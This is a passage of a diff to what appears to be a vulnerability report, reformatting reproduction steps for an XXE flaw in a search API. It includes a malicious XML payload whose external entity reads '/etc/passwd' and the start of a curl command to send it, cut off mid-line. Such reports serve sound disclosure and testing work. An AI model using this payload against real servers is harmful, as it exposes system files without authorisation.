@@ -11,14 +11,15 @@
 **Steps to produce:**
 
 1.Navigate to http://wasdat.fi:8080/api/articles/custom-search.
+
 2. Edit oldwasdat-exampe.xml- MALICIOUS XML document and include an external entity declaration pointing to a resource that want to access, in this case want to access
 
   ‘/etc/passwd’ on the server. As in the example below :
   
-   { <?xml version="1.0" encoding="UTF-8"?>
+   ?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-  <search>&xxe;</search> }
+  <search>&xxe;</search> 
 
 3. Send the request to the server by the command:
   curl -X POST http://wasdat.fi:8080/api/articles/custom-search -H "Content-Type:
